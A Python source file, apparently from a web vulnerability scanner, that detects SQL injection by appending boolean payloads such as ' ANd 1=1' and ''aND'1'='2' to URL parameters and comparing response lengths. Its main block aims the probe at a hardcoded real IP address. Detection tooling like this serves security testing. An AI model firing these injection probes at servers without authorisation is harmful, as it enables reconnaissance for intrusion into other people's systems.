#-*- coding:utf-8 -*-

#This module is simply for 
#testing if there's a sql injection point 
#inside the whole website
#which is hard to be found with manual methods.
#Only intend to find them out instead of exploit 
#them or fix them up.

import copy
from logs import LOG
from Requester import Requester
import urllib.parse 
from ThreadSettings import threadSettings

class Sqlitester():
    
    def __init__(self, target_url):
        
        #url decode first.
        self.target_url = self.urldecode(self.urldecode(target_url))
        self.potential_risk_param = {}
        self.num_type_id = False
        #test strength basic 1.
        self.test_order  = threadSettings.sqlinjection_class
        self.testphase  =  [" ANd 1=1"," aND 1=2","'AnD'1'='1","'aND'1'='2"]
        self.param_dic =  self.testurl()
        #threadSettings.result_queue.put("HEllo")
        
        if  self.param_dic is None:
            pass
        else:
            self.testparam(self.param_dic)
        
    def testurl(self):
        
        #Decode in case it's encoded first.
        param_dic   = {}
        try:
            self.parse_res = urllib.parse.urlparse(self.target_url)
        except Exception as e:
            print ("[*] " + str(e))
            return None
        params      =   []
        #check url params
        if  len(self.parse_res.query) != 0:
            params      = self.parse_res.query.split('&')
        else:
            #If there's actually no Parameter,
            #means there's not sqlinjection point.
            return None
        #Assume every parameter is in the form of : -> a=b
        #Transform a=b -> a:b key : value
        for param in params:
            temp  = param.split('=')
            param_dic[temp[0]] = temp[1]
        return param_dic
        
    def urldecode(self, target_url):
        
        return urllib.parse.unquote(target_url)
        
    def testparam(self, param_dic):
        
        keys = list(param_dic.keys())
        for key in keys:
            test_id     = key
            test_value  = param_dic[key]
            if  test_value.isdigit():
                self.num_type_id = True
            else:
                self.num_type_id = False
            Res = self.fuzz_test(param_dic,test_id,test_value,self.test_order,self.num_type_id)
            if len(Res) != 0:
                if 'ServerErr' in Res:
                    threadSettings.result_queue.put("LowRisk: " + self.target_url + str(Res))
                else:
                    threadSettings.result_queue.put("HighRisk " + self.target_url + str(Res))

    def fuzz_test(self,param_dic,key,value,class_order,is_num_type):
        
        #use standard urlparse-urlunparse.
        #to mantain everything in order.
        urlpart         = urllib.parse.urlparse(self.target_url)
        scheme          = urlpart.scheme
        netloc          = urlpart.netloc
        path            = urlpart.path
        params          = urlpart.params
        query           = urlpart.query
        fragment        = urlpart.fragment
        
        Res = ""
        #Check if the url is in troble.
        #If so ,put it into the res_queue.
        #Test one single parameter each time.
        if class_order == 1:
        #Perform the simplest test.
        #and'1'='1;and'1'='2
            fuzz_general    = ""
            fuzz_gen_error  = ""
            fuzz_normal     = ""
            fuzz_error      = ""
            if  is_num_type:
                #if parameter is numeric
                #This is basic test method.
                fuzz_normal     = value + self.testphase[0]
                fuzz_error      = value + self.testphase[1]
                fuzz_general    = value + self.testphase[2]
                fuzz_gen_error  = value + self.testphase[3]
            else:
                fuzz_normal     = value + self.testphase[2]
                fuzz_error      = value + self.testphase[3]
            #construct two different urls
            #send them by Requester
            #Set normal test dic
            param_dic[key]  = fuzz_normal
            if threadSettings.thread_debug:
                print ("[*] params:" + str(param_dic))
            LOG.WriteLog("[*] params:" + str(param_dic))
            normal_query = urllib.parse.urlencode(param_dic)
            #maintain url mainbody steady unchanged.
            normal_url   = urllib.parse.urlunparse(
                (scheme,netloc,path,params,normal_query,fragment))
            #print ("[*]Normal UrL: " + normal_url)
            response_normal = Requester.send(normal_url,None,'get')
            #if status code isn't 200. which means there
            #can be triggered as 500(internal error) or 
            #302 jump over to another page.#
            #both highly possible indicating that there's 
            #actually no sql injection point.
            if  response_normal.status_code != 200:
                #Crucial: When testing over a param, 
                #resume it to it's origin value!
                if threadSettings.thread_debug:
                    print ("[*]Server Error")
                LOG.WriteLog("[*]Server Error")
                param_dic[key] = value
                return key + "ServerErr"
            else:
                param_dic[key] = fuzz_error
                error_query    = urllib.parse.urlencode(param_dic)
                error_url      = urllib.parse.urlunparse(
                    (scheme,netloc,path,params,error_query,fragment))
                response_error = Requester.send(error_url, None, 'get')
                if  response_error.status_code != 200:
                    param_dic[key] = value
                    if threadSettings.thread_debug:
                        print ("[*] Suspicious injection point.")
                    LOG.WriteLog("[*] Suspicious injection point.")
                    return key + "ServerErr"
                else:
                    #Both normal and error url returns 200 now.
                    err_res     = len(response_error.content)
                    normal_res  = len(response_normal.content)
                    #Judging if there's any injection point.
                    if  (err_res-20 < normal_res and 
                        err_res+20 > normal_res):
                        #No sql injection because both returns same thing.
                        param_dic[key] = value
                        if threadSettings.thread_debug:
                            print ("[*] Cannot inject ,returns same")
                        LOG.WriteLog("[*] Cannot inject ,returns same")
                        #Give a chance to judge next if is numeric.
                        if is_num_type:
                            pass
                        else:
                            return ""
                    else:
                        #Great possbility there's an injection point!!
                        param_dic[key] = value
                        if threadSettings.thread_debug:
                            print ("[*] Great possiblity of injection point.")
                        LOG.WriteLog("[*] Great possiblity of injection point.")
                        return key
                    
            if len(fuzz_general) != 0:
                #NUM can also be presented as string
                #So for numeric circumstance
                #We use methods for String to test it again.
                param_dic[key]  = fuzz_general
                if threadSettings.thread_debug:
                    print ("[*] params:" + str(param_dic))
                LOG.WriteLog("[*] params:" + str(param_dic))
                normal_query = urllib.parse.urlencode(param_dic)
                #maintain url mainbody steady unchanged.
                normal_url   = urllib.parse.urlunparse(
                    (scheme,netloc,path,params,normal_query,fragment))
                #print ("[*]Normal UrL: " + normal_url)
                response_gen_normal = Requester.send(normal_url,None,'get')
                if  response_gen_normal.status_code != 200:
                    #Crucial: When testing over a param, 
                    #resume it to it's origin value!
                    if threadSettings.thread_debug:
                        print ("[*]Server Error")
                    LOG.WriteLog("[*]Server Error")
                    param_dic[key] = value
                    return key + "ServerErr"
                else:
                    param_dic[key] = fuzz_gen_error
                    error_query    = urllib.parse.urlencode(param_dic)
                    error_url      = urllib.parse.urlunparse(
                        (scheme,netloc,path,params,error_query,fragment))
                    response_gen_error = Requester.send(error_url, None, 'get')
                    if  response_gen_error.status_code != 200:
                        param_dic[key] = value
                        if threadSettings.thread_debug:
                            print ("[*] Suspicious injection point.")
                        LOG.WriteLog("[*] Suspicious injection point.")
                        return key + "ServerErr"
                    else:
                        #Both normal and error url returns 200 now.
                        err_res     = len(response_gen_error.content)
                        normal_res  = len(response_gen_normal.content)
                        #Judging if there's any injection point.
                        if  (err_res-20 < normal_res and 
                             err_res+20 > normal_res):
                            #No sql injection because both returns same thing.
                            param_dic[key] = value
                            if threadSettings.thread_debug:
                                print ("[*] Cannot inject ,returns same")
                            LOG.WriteLog("[*] Cannot inject ,returns same")
                            return ""
                        else:
                            #Great possbility there's an injection point!!
                            param_dic[key] = value
                            if threadSettings.thread_debug:
                                print ("[*] Great possiblity of injection point.")
                            LOG.WriteLog("[*] Great possiblity of injection point.")
                            return key
                
if __name__ == "__main__":
    
    tester = Sqlitester("http://202.38.232.84/eresources/edetail.php?id=1")
    